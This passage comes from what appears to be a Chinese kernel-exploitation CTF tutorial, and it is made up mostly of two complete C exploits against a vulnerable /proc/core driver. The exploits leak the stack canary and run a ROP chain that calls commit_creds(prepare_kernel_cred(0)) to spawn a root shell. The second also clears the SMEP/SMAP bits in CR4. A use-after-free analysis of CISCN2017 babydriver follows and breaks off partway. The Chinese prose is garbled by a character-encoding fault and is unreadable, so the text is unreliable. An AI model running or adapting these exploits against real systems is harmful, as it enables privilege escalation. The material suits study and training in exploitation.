<span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((commit_creds_addr&amp;prepare_kernel_cred_addr))<br>    &#123;<br>        vmlinux_base=commit_creds_addr<span class="hljs-number">-0x9c8e0</span>;<br>    &#125;   <br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> idx)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]set off to %lx\033[0m\n&quot;</span>,idx);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, idx);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]read to buf.\033[0m\n&quot;</span>);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]copy from user with size: %lx\033[0m\n&quot;</span>,size);<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* (*pkc)(<span class="hljs-type">int</span>) = prepare_kernel_cred_addr;<br>    <span class="hljs-type">void</span> (*cc)(<span class="hljs-type">char</span>*) = commit_creds_addr;<br>    (*cc)((*pkc)(<span class="hljs-number">0</span>));<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    save_status();<br>    find_symbols();<br>    <span class="hljs-type">size_t</span> raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-type">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;<span class="hljs-comment">//ssize_t=long int,size_t=unsign int</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] offest=%lx\033[0m\n&quot;</span>,offset);<br><br>    <span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/proc/core&quot;</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /proc/core error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    set_off(fd, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    core_read(fd, buf);<br>    <span class="hljs-type">size_t</span> canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]canary=%p\033[0m\n&quot;</span>,canary);<br>    <br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        rop[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (i==<span class="hljs-number">8</span>)rop[i]=canary;<br>    &#125;<br>    rop[i++] = (<span class="hljs-type">size_t</span>)get_root;<br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff81a012da</span> + offset; <span class="hljs-comment">// swapgs; popfq; ret</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff81050ac2</span> + offset; <span class="hljs-comment">// iretq; ret; </span><br>    <br>    rop[i++] = (<span class="hljs-type">size_t</span>)spawn_shell;         <span class="hljs-comment">// rip </span><br>    <br>    rop[i++] = user_cs;<br>    rop[i++] = user_rflags;<br>    rop[i++] = user_sp;<br>    rop[i++] = user_ss;<br>    <br>    write(fd, rop, <span class="hljs-number">0x800</span>);<br>    core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="BYPASS-SMEP-SMAP">BYPASS SMEP/SMAP:</h4><h5 id="0x01åˆ†æ">0x01åˆ†æ</h5><p>è¿˜æ˜¯ä»¥è¿™é¢˜ä¸ºä¾‹</p><p>å¾€start.shåŠ ä¸Šsmap,smepä¿æŠ¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-cpu qemu64-v1,+smep,+smap \<br></code></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œget_rootè„šæœ¬å‘ç°å†…æ ¸æŠ¥é”™é‡å¯äº†ï¼Œå› ä¸ºsmepä¿æŠ¤,åœ¨å†…æ ¸æ€ç”¨æˆ·æ€çš„ä»£ç ä¸å¯æ‰§è¡Œ</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1.png" alt="1"></p><p>å†…æ ¸æ ¹æ®cr4å¯„å­˜å™¨çš„ç¬¬20,21ä½çš„å€¼æ¥åˆ¤æ–­smepä¿æŠ¤å’Œsmapä¿æŠ¤æ˜¯å¦å¼€å¯</p><p>ï¼ˆå·ä¸€å¼ å›¾ï¼‰</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/cr4.png" alt="cr4"></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ROPæŠŠsmepå’Œsmapä½ç½®ä¸º0ï¼Œå°±å…³æ‰äº†ä¿æŠ¤</p><p><strong>è§£é‡Šä¸‹é¢è¿™ä¸€ä¸²ropé“¾ï¼š</strong></p><p>å°±æ˜¯æŠŠcr4å¯„å­˜å™¨èµ‹å€¼ç»™rax</p><p>æˆ‘ä»¬æ¥ç€æŠŠrdiå¯„å­˜å™¨èµ‹å€¼0xffffffffffcfffff</p><p>raxå’Œrdiå¯„å­˜å™¨æŒ‰ä½ä¸å°±åˆšå¥½æŠŠ20ï¼Œ21ä½çš„å€¼å˜ä¸º0äº†</p><p>ç›¸å½“äºæŠŠä¿æŠ¤å…³äº†</p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥ç”¨<code>(*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));</code>å»ææƒäº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[i++] = <span class="hljs-number">0xffffffff8106669c</span> + offset;<span class="hljs-comment">// mov rax, cr4; test ah, 0x20; jne 0x2666aa; add rsp, 8; pop rbx; ret;</span><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff81000b2f</span> + offset;<span class="hljs-comment">// pop rdi; ret;</span><br>rop[i++] = <span class="hljs-number">0xffffffffffcfffff</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff8102b45b</span> + offset;<span class="hljs-comment">// and rax, rdi; ret;</span><br><br>rop[i++] = <span class="hljs-number">0xffffffff81002515</span> + offset;<span class="hljs-comment">// mov cr4, rax; push rcx; popfq; ret;</span><br><br>rop[i++] = (<span class="hljs-type">size_t</span>)get_root;<br></code></pre></td></tr></table></figure><h5 id="0x02exp-2">0x02exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc bypass.c -static -masm=intel -g -o bypass</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> vmlinux_base=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /tmp/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /tmp/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((commit_creds_addr&amp;prepare_kernel_cred_addr))<br>    &#123;<br>        vmlinux_base=commit_creds_addr<span class="hljs-number">-0x9c8e0</span>;<br>    &#125;   <br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> idx)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]set off to %lx\033[0m\n&quot;</span>,idx);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, idx);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]read to buf.\033[0m\n&quot;</span>);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]copy from user with size: %lx\033[0m\n&quot;</span>,size);<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* (*pkc)(<span class="hljs-type">int</span>) = prepare_kernel_cred_addr;<br>    <span class="hljs-type">void</span> (*cc)(<span class="hljs-type">char</span>*) = commit_creds_addr;<br>    (*cc)((*pkc)(<span class="hljs-number">0</span>));<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    save_status();<br>    find_symbols();<br>    <span class="hljs-type">size_t</span> raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-type">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;<span class="hljs-comment">//ssize_t=long int,size_t=unsign int</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] offest=%lx\033[0m\n&quot;</span>,offset);<br><br><span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/proc/core&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /proc/core error!\033[0m\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>set_off(fd, <span class="hljs-number">0x40</span>);<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>core_read(fd, buf);<br><span class="hljs-type">size_t</span> canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]canary=%p\033[0m\n&quot;</span>,canary);<br><br><span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>&#123;<br>    rop[i] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (i==<span class="hljs-number">8</span>)rop[i]=canary;<br>&#125;<br>rop[i++] = <span class="hljs-number">0xffffffff8106669c</span> + offset;<span class="hljs-comment">// mov rax, cr4; test ah, 0x20; jne 0x2666aa; add rsp, 8; pop rbx; ret;</span><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff81000b2f</span> + offset;<span class="hljs-comment">// pop rdi; ret;</span><br>rop[i++] = <span class="hljs-number">0xffffffffffcfffff</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff8102b45b</span> + offset;<span class="hljs-comment">// and rax, rdi; ret;</span><br><br>rop[i++] = <span class="hljs-number">0xffffffff81002515</span> + offset;<span class="hljs-comment">// mov cr4, rax; push rcx; popfq; ret;</span><br><br>rop[i++] = (<span class="hljs-type">size_t</span>)get_root;<br><br>rop[i++] = <span class="hljs-number">0xffffffff81a012da</span> + offset; <span class="hljs-comment">// swapgs; popfq; ret</span><br>rop[i++] = <span class="hljs-number">0</span>;<br><br>rop[i++] = <span class="hljs-number">0xffffffff81050ac2</span> + offset; <span class="hljs-comment">// iretq; ret; </span><br><br>rop[i++] = (<span class="hljs-type">size_t</span>)spawn_shell;         <span class="hljs-comment">// rip </span><br><br>rop[i++] = user_cs;<br>rop[i++] = user_rflags;<br>rop[i++] = user_sp;<br>rop[i++] = user_ss;<br><br>write(fd, rop, <span class="hljs-number">0x800</span>);<br>core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>æˆåŠŸææƒåˆ°root</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/bypassgetroot.png" alt="bypassgetroot"></p><h2 id="03-kernel-uaf">03.kernel uaf</h2><h3 id="CISCN2017-babydriver">CISCN2017 - babydriver</h3><h4 id="0x01ç¨‹åºåˆ†æ">0x01ç¨‹åºåˆ†æ</h4><p>è§£å‹ä¸‹cpio,é¡ºä¾¿ç”¨extract-vmlinuxè§£å‹bzImageå‡ºvmlinux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir core<br>cd core<br>mv ../rootfs.cpio rootfs.cpio.gz<br>gunzip ./rootfs.cpio.gz<br>cpio -idm &lt; ./rootfs.cpio<br>cp ./rootfs.cpio ../<br>cd ..<br>chmod +777 extract-vmlinux<br>./extract-vmlinux ./bzImage &gt; vmlinux<br>chmod +777 vmlinux<br><br></code></pre></td></tr></table></figure><h5 id="1-æŸ¥çœ‹initï¼š">1.æŸ¥çœ‹initï¼š</h5><p>å¯ä»¥çœ‹åˆ°è½½å…¥äº†LKM(å¯åŠ è½½å†…æ ¸æ¨¡å—)babydriver.ko</p><p>æ¼æ´åŸºæœ¬å‡ºåœ¨è¿™</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2017babydriver1.png" alt="2017babydriver1"></p><h5 id="2-æŸ¥çœ‹ä¿æŠ¤">2.æŸ¥çœ‹ä¿æŠ¤</h5><p>æ— canaryï¼Œpie</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/5.png" alt="5"></p><h5 id="3-idaåˆ†æbabydriver-ko">3.idaåˆ†æbabydriver.ko</h5><h6 id="ä¸€-ä¸¤ä¸ªç»“æ„ä½“">ä¸€.ä¸¤ä¸ªç»“æ„ä½“</h6><p>å¯ä»¥çœ‹çœ‹<a href="https://beafb1b1.github.io/kernel/ciscn_2017_babydriver_UAF/#_1">CISCN2017 babydriver(UAF) - b1b1â€™s share (beafb1b1.github.io)</a>åˆ†æçš„çœŸä¸é”™</p><p>ida shift+F9å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹ç»“æ„</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/6.png" alt="6"></p><p>æˆ‘ä»¬ç‚¹å‡»ä¸Šå›¾ä¸­çš„XREFï¼Œç„¶åctrl+xæŸ¥çœ‹é‚£ä¸ªfopsçš„äº¤å‰å¼•ç”¨</p><p>å‘ç°æ˜¯è¿™ä¸ªå‡½æ•°</p><p><code>cdev_init(&amp;cdev_0, &amp;fops);</code></p><p>æˆ‘ä»¬ç‚¹å¼€è¿™ä¸ª<code>&amp;fops</code></p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/7.png" alt="7"></p><p>åæ­£å®é™…æ˜¯è¿™ä¸ªå¯¹åº”å…³ç³»</p><blockquote><p>read:babyread</p><p>write:babywrite</p><p>unlocked_ioctl:babyioctl</p><p>open:babyopen</p></blockquote><p><strong>è¿˜æœ‰å¦ä¸€ä¸ªç»“æ„:{buf,buf_len}</strong></p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2.png" alt="2"></p><h6 id="äºŒ-ä¸€äº›å‡½æ•°">äºŒ.ä¸€äº›å‡½æ•°</h6><p><strong>ç¨‹åºå¼€å§‹ï¼Œç»“æŸä¼šè‡ªåŠ¨è¿›å…¥babydriver_initï¼Œbabydriver_exitï¼Œ</strong></p><p><strong>å¯¹è®¾å¤‡æ–‡ä»¶ä½¿ç”¨readæˆ–writeä¼šè°ƒç”¨babyread,babywriteå‡½æ•°</strong></p><p>å°±æ˜¯åœ¨device_bufæŒ‡å‘çš„å†…å­˜è¯»å†™device_buf_lené•¿åº¦</p><p><strong>å¯¹è®¾å¤‡æ–‡ä»¶ä½¿ç”¨openä¼šè°ƒç”¨babyopenå‡½æ•°</strong></p><p>opençš„æ—¶å€™éƒ½ä¼šé€šè¿‡kmallocç”³è¯·ä¸€å—64å­—èŠ‚å¤§å°çš„å†…å­˜ï¼Œå¹¶æŠŠæŒ‡é’ˆå­˜å‚¨åœ¨bssä¸Šçš„å…¨å±€å˜é‡babydev_structçš„device_bufï¼ŒåŒæ—¶æ›´æ–°babydev_structçš„device_buf_lenä¸º64ã€‚</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/3.png" alt="3"></p><p><strong>å¯¹è®¾å¤‡æ–‡ä»¶ä½¿ç”¨ioctlä¼šè°ƒç”¨babyioctlå‡½æ•°</strong></p><p>ç”³è¯·ä¸€ä¸ªæˆ‘ä»¬æŒ‡å®šé•¿åº¦çš„å†…å­˜ï¼Œå¹¶æŠŠæŒ‡é’ˆå­˜å‚¨åœ¨bssä¸Šçš„å…¨å±€å˜é‡babydev_structçš„device_bufï¼ŒåŒæ—¶æ›´æ–°babydev_structçš„device_buf_lenä¸ºæˆ‘ä»¬æŒ‡å®šçš„é•¿åº¦</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/4.png" alt="4"></p><h5 id="4-æ¼æ´ç‚¹">4.æ¼æ´ç‚¹</h5><p>å­˜åœ¨UAFæ¼æ´ï¼Œbabydev_structæ˜¯å…¨å±€å˜é‡ï¼Œæˆ‘ä»¬å¦‚æœopenä¸¤æ¬¡ï¼Œå°±æ˜¯ä¸¤ä¸ªæŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œæˆ‘ä»¬releaseæ‰ä¸€ä¸ªï¼Œç„¶åè¿™ä¸ªæŒ‡é’ˆå¹¶æœªç½®ä¸ºnullï¼Œè¿˜æœ‰ä¸€ä¸ªè¿˜åœ¨ä½¿ç”¨ï¼Œå°±èƒ½uafäº†</p><h4 